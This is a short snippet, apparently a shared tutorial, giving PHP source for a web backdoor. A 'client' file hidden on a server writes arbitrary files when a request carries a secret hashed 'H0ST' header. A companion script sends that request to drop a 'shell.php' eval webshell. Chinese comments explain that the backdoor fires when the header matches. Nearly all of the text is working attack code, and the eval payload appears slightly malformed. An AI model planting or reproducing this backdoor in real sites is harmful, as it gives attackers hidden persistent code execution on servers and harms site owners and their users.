Client：

<?php
if(crypt($_SERVER['HTTP_H0ST'],51)=='514zR17F8j0q6'){@file_put_contents($_SERVER['HTTP_X'],$_SERVER['HTTP_Y']);
header("Location: ./".$_SERVER['HTTP_X']);};
?>
Server:

<?php
$fp = fsockopen("127.0.0.1",80,$errno,$errstr,5);
if (!$fp){
echo('fp fail');
}
$out = "GET /php_muma/client.php HTTP/1.1\r\n";
$out .= "Content-Type: application/x-www-form-urlencoded\r\n";
$out .= "User-Agent: MSIE\r\n";
$out .= "Host: 127.0.0.1\r\n";
$out .= "H0ST: qiushui51a\r\n";
$out .= "X: ../shell.php \r\n";
$out .= "Y: <?php eval(\$_POST1);?>\r\n";
$out .= "Connection: close\r\n\r\n";
fwrite($fp,$out);
while(!feof($fp)){
$resp_str="";
$resp_str .= fgets($fp,512);//返回值放入$resp_str
}
fclose($fp);
echo($resp_str);//处理返回值.
?>
对服务端与客户端指令对比，如一致则执行后门指令。